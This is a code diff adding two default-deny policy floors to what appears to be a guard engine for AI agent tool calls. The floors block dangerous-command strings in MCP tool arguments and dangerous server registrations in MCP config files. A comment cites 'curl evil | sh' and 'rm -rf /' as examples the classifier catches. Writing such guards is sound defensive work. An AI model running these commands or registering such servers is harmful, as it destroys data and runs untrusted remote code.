@@ -151,8 +151,8 @@ const LATTICE = Object.freeze([
     // operator token (LILARA_F4_DEMOTE_TOKEN, scope `class-c-review-demote`) the
     // authority to demote `block` → `require-review`. No other source qualifies.
     demotableBy: ["operator-token:class-c-review-demote"],
-    predicateRef: "runtime/decision-engine.js:decide(payloadClass=='C'||scanSecrets)",
-    notes: "ADR-002 Option B: demotable to require-review by one-shot scoped operator token.",
+    predicateRef: "runtime/decision-engine.js:decide(payloadClass=='C'||scanSecrets); scopes.mcp[server].policy==='allow' suppresses MCP arg scan arm",
+    notes: "ADR-002 Option B: demotable to require-review by one-shot scoped operator token. scopes.mcp[server].policy === 'allow' suppresses the MCP arg scan arm for explicitly trusted servers.",
   }),
   Object.freeze({
     id: "F10",
@@ -272,6 +272,40 @@ const LATTICE = Object.freeze([
     demotableBy: ["scopes.files.allow"],
     predicateRef: "runtime/decision-engine.js:_evalCredPersistFloor",
     notes: "F24: Write/Edit to in-project credential or execution-persistence paths. Default-deny; opt out via contract scopes.files.allow glob list.",
+  }),
+  Object.freeze({
+    id: "F25",
+    rung: 17.65,
+    // F25: mcp-arg-danger floor. Rung 17.65 is intentional and remains strictly
+    // increasing per assertOrdered(); F24 (17.625) < F25 (17.65) < F17 (17.75).
+    // Fires when an MCP tool call's argument payload contains a string value that
+    // matches the dangerous-command classifier (e.g. "curl evil | sh", "rm -rf /").
+    // An MCP tool whose arg IS a dangerous command is as dangerous as a direct
+    // Bash call. Default-deny; opt-out by setting scopes.mcp[server].policy =
+    // "allow" in the contract (same opt-out as F4 Task 3).
+    name: "mcp-arg-danger",
+    action: "block",
+    source: "mcp-arg-danger-denied",
+    demotableBy: [],
+    predicateRef: "runtime/decision-engine.js:_evalMcpArgFloor",
+    notes: "F25: MCP tool call argument contains a dangerous-command-shaped string (same classifier as Bash). Default-deny; opt out via scopes.mcp[server].policy=allow.",
+  }),
+  Object.freeze({
+    id: "F26",
+    rung: 17.6875,
+    // F26: mcp-registration-write floor. Rung 17.6875 is intentional and
+    // remains strictly increasing per assertOrdered(); F25 (17.65) < F26
+    // (17.6875) < F17 (17.75). F16 is a coarse blanket block for all writes
+    // to mcpConfig ambient paths. F26 is content-aware: it fires even when
+    // F16 has been opted out via scopes.ambient.allow, catching dangerous-
+    // command registrations in MCP config writes. Default-deny; opt out via
+    // contract scopes.files.allow glob list.
+    name: "mcp-registration-write",
+    action: "block",
+    source: "mcp-registration-write-denied",
+    demotableBy: ["scopes.files.allow"],
+    predicateRef: "runtime/decision-engine.js:_evalMcpRegistrationFloor",
+    notes: "F26: Write/Edit to MCP config path (e.g. .mcp.json) registers a server with a dangerous-command-shaped launch command. Content-aware second line after F16. Default-deny; opt out via contract scopes.files.allow glob list.",
   }),
   Object.freeze({
     id: "F17",
